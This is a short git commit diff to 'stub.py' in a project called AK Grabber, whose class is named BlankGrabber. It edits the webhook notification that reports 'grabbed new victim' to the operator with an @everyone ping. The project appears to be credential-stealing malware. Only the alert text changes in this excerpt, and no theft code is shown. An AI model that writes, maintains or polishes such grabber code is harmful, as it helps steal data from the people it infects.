f6e5a56be6320870cde010b08f652f93732d94db
Unknown chess pawn <unknownchesspawn@gmail.com>
2025-02-13 13:00:49 +0300

    Update stub.py

--- AK Grabber/Components/stub.py
+++ AK Grabber/Components/stub.py
@@ -1680,7 +1680,7 @@ class BlankGrabber:
                 image_url = "https://avatars.githubusercontent.com/u/194596336?v=4"
 
                 payload = {
-                    "content": "||@everyone|| 🃅 grabbed new victim 🃅 " if Settings.PingMe else "",
+                    "content": "||@everyone|| grabbed new victim  " if Settings.PingMe else "",
                     "embeds": [
                         {
                             "title": "AK Grabber",
